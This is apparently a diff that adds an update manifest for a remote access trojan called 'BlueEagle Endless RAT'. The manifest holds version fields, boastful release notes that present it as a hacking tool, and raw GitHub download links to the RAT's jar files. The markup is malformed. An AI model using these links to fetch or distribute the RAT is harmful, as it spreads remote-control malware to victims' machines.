@@ -1,4 +1,19 @@
-NULL
-#15we5r1t23452rf0ew5f3405g
-$5
-#stx
+<config>
+<Start>
+<Standard Version = '1.2'></Standard Version>
+<Update Version = '1.2'></Update Version>
+<Update Version = '1.2'></Update Version>
+<String Values =""
+set Values = "_
+jsz=12
+jname=Saher Blue Eagle Endless Tool
+jrelease_notes=ReleaseNotes*-*This Version is dangerous version for a continuously updated tool for Pentration testing and HacK like a Pro*-*Best Regards*-*Saher Blue Eagle*-*REMEMBER THE Warning to Universe*-*
+jupdate=1.2
+jversion=1.20
+joptions=https://github.com/SaherBlueEagle/BlueEagle-Endless-RAT/raw/main/Release/SBEjRAT_Instance.jar
+jold_instance=https://github.com/SaherBlueEagle/BlueEagle-Endless-RAT/raw/main/Old_Instance/SBEjRAT_Instance.jar
+jmain_update=https://github.com/SaherBlueEagle/BlueEagle-Endless-RAT/raw/main/Release/SBEjRAT.jar
+jupdatestatus=Critical 
+              _"></String>
+<End>
+</config>
